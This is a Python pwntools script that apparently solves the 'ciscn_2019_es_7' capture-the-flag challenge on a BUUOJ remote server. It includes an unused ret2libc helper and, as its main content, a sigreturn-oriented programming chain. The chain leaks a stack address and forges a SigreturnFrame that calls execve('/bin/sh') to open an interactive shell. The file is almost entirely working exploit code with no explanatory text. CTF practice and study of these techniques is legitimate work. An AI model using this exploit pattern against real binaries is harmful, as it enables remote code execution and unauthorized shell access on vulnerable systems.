from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './ciscn_2019_es_7'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',27308) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')

def dbg():
	gdb.attach(p)
	pause()

# start
read = 0x4004f1
s(flat('/bin/sh\x00',0,read))
r(0x20)
stack = uu64(r(6))

syscall = 0x400517
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = stack-280
frame.rsi = 0
frame.rdx = 0
frame.rsp = stack
frame.rip = syscall

mov_rax_15 = 0x4004da
payload = flat('a'*0x10,mov_rax_15,syscall) + str(frame)
s(payload)
# end

itr()
